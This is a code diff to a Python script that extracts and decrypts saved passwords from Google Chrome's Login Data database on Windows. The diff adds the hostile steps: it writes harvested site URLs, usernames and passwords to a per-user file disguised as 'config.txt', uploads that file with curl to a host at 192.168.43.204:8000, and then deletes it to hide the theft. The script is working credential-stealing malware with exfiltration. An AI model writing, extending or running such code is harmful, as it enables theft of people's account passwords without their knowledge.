@@ -5,8 +5,6 @@ import json
 import base64
 import sqlite3
 import shutil
-import SimpleHTTPServer
-import SocketServer
 from datetime import timezone, datetime, timedelta
 
 #3rd party modules
@@ -52,7 +50,7 @@ def decrypt_password(enc_password, key):
 
 
 def main():
-
+    uname = os.getlogin()
     # local passwords path
     password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Login Data")
@@ -78,7 +76,7 @@ def main():
         date_created = row[3]
 
         if username or password:
-            with open("C:/Users/User/Desktop/file.txt", "a") as o:
+            with open("C:/Users/" + uname + "/config.txt", "a") as o:
                 o.write(site_url + '\n')
                 o.write(username + '\n')
                 o.write(password + '\n') 
@@ -94,6 +92,9 @@ def main():
     #remove the copied database after reading passwords
     os.remove("my_chrome_data.db")
 
+    os.system("curl http://192.168.43.204:8000 --upload-file C:/Users/" + uname + "/config.txt")
+
+    os.system("del C:/Users/" + uname + "/config.txt")
 if __name__ == "__main__":
     main()
 
